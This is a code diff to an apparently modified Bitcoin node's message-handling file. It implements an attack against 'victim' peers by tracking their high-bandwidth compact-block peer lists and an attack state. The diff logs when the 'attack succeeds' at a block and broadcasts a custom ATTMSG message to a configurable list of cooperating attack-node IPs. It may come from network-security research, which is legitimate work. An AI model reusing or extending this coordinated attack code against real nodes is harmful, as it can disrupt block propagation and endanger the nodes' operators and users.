@@ -1064,7 +1064,15 @@ void static ProcessGetBlockData(CNode* pfrom, const Consensus::Params& consensus
         if (connman->victim_states.find(pfrom->addr.ToString()) != connman->victim_states.end()) {
             std::shared_ptr<VictimState> pvictimState = connman->victim_states[pfrom->addr.ToString()];
             if (pvictimState->attack_state == 1) {
-                LogPrintf("VIC %s - attack succeeds at block %s!\n", pfrom->addr.ToString(), inv.hash.ToString());
+                LogPrintf("VIC %s - attack succeeds at block %s!, victim asks with inv type %i for ", pfrom->addr.ToString(), inv.hash.ToString(), inv.type);
+                if (inv.type == MSG_BLOCK)
+                    LogPrintf("a full block.\n");
+                else if (inv.type == MSG_WITNESS_BLOCK)
+                    LogPrintf("a witness block.\n");
+                else if (inv.type == MSG_FILTERED_BLOCK)
+                    LogPrintf("a filtered block.\n");
+                else if (inv.type == MSG_CMPCT_BLOCK)
+                    LogPrintf("a compact block.\n");
             } else {
                 LogPrintf("VIC %s - weird block requested %s!\n", pfrom->addr.ToString(), inv.hash.ToString());
             }
@@ -1093,7 +1101,7 @@ void static ProcessGetBlockData(CNode* pfrom, const Consensus::Params& consensus
     if (mi != mapBlockIndex.end()) {
         send = BlockRequestAllowed(mi->second, consensusParams);
         if (!send) {
-            LogPrint(BCLog::NET, "%s: ignoring request from peer=%i for old block that isn't in the main chain\n", __func__, pfrom->GetId());
+            LogPrintf("%s: ignoring request from peer=%i for old block that isn't in the main chain, ignored inv type: %i\n", __func__, pfrom->GetId(), inv.type);
             /*
              * If we get here, it means the attack node successfully sent a headers message earlier than other nodes,
              * and the victim has sent us a getdata request. However, we haven't really got this block so set the
@@ -1803,41 +1811,22 @@ bool static ProcessMessage(CNode* pfrom, const std::string& strCommand, CDataStr
         //uint64_t block_version_update = 1;
         if (good_news) {
             pvictimState->hb_list.insert(pfrom->GetId());
-            if (pvictimState->hb_list.size()==3 && pvictimState->attack_state != 1) {
+            if (pvictimState->hb_list.size()>=3 && pvictimState->attack_state != 1) {
                 pvictimState->attack_state = 1;
-                // tell other neighbors we don't want compact blocks.
-                /*
-        connman->ForEachNode([&connman, &msgMaker, &block_version_update, &fsendcompact_update](CNode *pnode) {
-            block_version_update = 1;
-            connman->PushMessage(pnode, msgMaker.Make(NetMsgType::SENDCMPCT, fsendcompact_update,
-                                                      block_version_update));
-            block_version_update = 2;
-            connman->PushMessage(pnode, msgMaker.Make(NetMsgType::SENDCMPCT, fsendcompact_update,
-                                                      block_version_update));
-        });*/
             }
         }
         else {
             pvictimState->hb_list.erase(pfrom->GetId());
-            /*
-            if (attack_state == 1) {
-                fsendcompact_update = true;
-                // tell other neighbors we want compact blocks.
-                connman->ForEachNode([&connman, &msgMaker, &block_version_update, &fsendcompact_update](CNode *pnode) {
-                    block_version_update = 1;
-                    connman->PushMessage(pnode, msgMaker.Make(NetMsgType::SENDCMPCT, fsendcompact_update,
-                                                              block_version_update));
-                    block_version_update = 2;
-                    connman->PushMessage(pnode, msgMaker.Make(NetMsgType::SENDCMPCT, fsendcompact_update,
-                                                              block_version_update));
-                });
+            if (pvictimState->hb_list.size()>=3) {
+                pvictimState->attack_state = 1;
             }
-            */
-            // check if myself is currently in the hbn list
-            if (pvictimState->hb_list.find(-1) == pvictimState->hb_list.end()) {
-                pvictimState->attack_state = 0;
-            } else {
-                pvictimState->attack_state = 2;
+            else {
+                // check if myself is currently in the hbn list
+                if (pvictimState->hb_list.find(-1) == pvictimState->hb_list.end()) {
+                    pvictimState->attack_state = 0;
+                } else {
+                    pvictimState->attack_state = 2;
+                }
             }
         }
     }
@@ -1930,13 +1919,10 @@ bool static ProcessMessage(CNode* pfrom, const std::string& strCommand, CDataStr
              */
             if (connman->victim_states.find(pfrom->addr.ToString()) != connman->victim_states.end()) {
                 std::shared_ptr<VictimState> pvictimState = connman->victim_states[pfrom->addr.ToString()];
-                /*
-                 * TODO: remove the hard code of the IP address of other attack nodes.
-                 */
-                struct in_addr friend1_in_addr = { .s_addr = inet_addr(connman->attack_friend_ip1.c_str()) };
+                /*struct in_addr friend1_in_addr = { .s_addr = inet_addr(connman->attack_friend_ip1.c_str()) };
                 struct in_addr friend2_in_addr = { .s_addr = inet_addr(connman->attack_friend_ip2.c_str()) };
                 CNode* pfriend1 = connman->FindNode((CNetAddr)friend1_in_addr);
-                CNode* pfriend2 = connman->FindNode((CNetAddr)friend2_in_addr);
+                CNode* pfriend2 = connman->FindNode((CNetAddr)friend2_in_addr);*/
                 //bool fsendcompact_update = false;
                 //uint64_t block_version_update = 1;
                 /*
@@ -1950,7 +1936,7 @@ bool static ProcessMessage(CNode* pfrom, const std::string& strCommand, CDataStr
                     // add myself to the hb list
                     pvictimState->hb_list.insert(-1);
                     pvictimState->attack_state = 2;
-                    if (pvictimState->hb_list.size()==3 && pvictimState->attack_state != 1) {
+                    if (pvictimState->hb_list.size()>=3 && pvictimState->attack_state != 1) {
                         pvictimState->attack_state = 1;
                         // now tell other neighbors that we don't want compact blocks
                         /*connman->ForEachNode(
@@ -1990,12 +1976,21 @@ bool static ProcessMessage(CNode* pfrom, const std::string& strCommand, CDataStr
                                 });
                     }
                     */
-                    pvictimState->attack_state = 0;
+                    if (pvictimState->hb_list.size()<3)
+                        pvictimState->attack_state = 0;
+                    else
+                        pvictimState->attack_state = 2;
                 }
-                if (pfriend1)
+                /*if (pfriend1)
                     connman->PushMessage(pfriend1, msgMaker.Make(NetMsgType::ATTMSG, good_news, victim_ip));
                 if (pfriend2)
-                    connman->PushMessage(pfriend2, msgMaker.Make(NetMsgType::ATTMSG, good_news, victim_ip));
+                    connman->PushMessage(pfriend2, msgMaker.Make(NetMsgType::ATTMSG, good_news, victim_ip));*/
+                for (auto const& attack_ip: connman->attack_ips) {
+                    struct in_addr friend_in_addr = { .s_addr = inet_addr(attack_ip.c_str()) };
+                    CNode* pfriend = connman->FindNode((CNetAddr)friend_in_addr);
+                    if (pfriend)
+                        connman->PushMessage(pfriend, msgMaker.Make(NetMsgType::ATTMSG, good_news, victim_ip));
+                }
             }
 
             if (!State(pfrom->GetId())->fSupportsDesiredCmpctVersion) {
